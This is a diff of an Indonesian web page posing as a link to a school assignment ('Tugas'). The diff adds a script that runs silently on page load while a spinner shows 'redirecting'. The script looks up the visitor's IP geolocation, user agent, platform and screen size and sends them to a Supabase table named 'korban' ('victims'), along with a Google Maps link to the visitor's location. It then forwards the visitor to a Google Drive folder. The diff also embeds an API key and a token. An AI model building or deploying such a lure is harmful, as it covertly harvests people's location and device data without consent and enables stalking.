@@ -1,28 +1,75 @@
 <!DOCTYPE html>
 <html lang="id">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Tugas, 21/4/25</title>
-    <style>
-      body {
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-        text-align: center;
-        padding-top: 100px;
+<head>
+  <meta charset="UTF-8">
+  <title>Mengalihkan ke Tugas...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+      flex-direction: column;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #ccc;
+      border-top-color: #25A667;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+  <script type="module">
+    import { createClient } from 'https://esm.sh/@supabase/supabase-js'
+
+    const supabase = createClient(
+      'https://ldxmkrwegqlyakffxzif.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeG1rcndlZ3FseWFrZmZ4emlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU2NDAyMzcsImV4cCI6MjA2MTIxNjIzN30.7nY7oKtA457JxuQllX2UwREBH41bByWcbGp_L05K28I'
+    );
+
+    async function trackUser() {
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=8f8f1f3820adfb");
+        const data = await res.json();
+        const [lat, lon] = data.loc.split(",");
+        const mapLink = `https://maps.google.com/maps?q=${lat},${lon}&z=15`;
+
+        await supabase.from("korban").insert([{
+          ip: data.ip,
+          city: data.city,
+          country: data.country,
+          loc: data.loc,
+          user_agent: navigator.userAgent,
+          platform: navigator.platform,
+          resolution: `${window.screen.width} x ${window.screen.height}`,
+          maps_link: mapLink
+        }]);
+      } catch (error) {
+        console.error("Gagal mengambil data IPInfo:", error);
+      } finally {
+        redirectToTask();
       }
-      a {
-        background-color: #25A667;
-        color: white;
-        padding: 15px 30px;
-        border-radius: 8px;
-        text-decoration: none;
-        font-size: 20px;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>Ada Tugas Baru, nih!</h1>
-    <p>Klik tombol di bawah ini untuk melihat tugasnya, ya!.</p>
-    <br>
-    <a href="track.html">Tugas Baru</a>
-  </body>
+    }
+
+    function redirectToTask() {
+      window.location.href = "https://drive.google.com/drive/folders/1mn6XwN7c6lYOPxhQscwcbLfW4_sgEEq8?hl=ID";
+    }
+
+    trackUser();
+  </script>
+</head>
+<body>
+  <div class="spinner"></div>
+  <h2>Mengalihkan ke tugas, mohon tunggu...</h2>
+</body>
 </html>
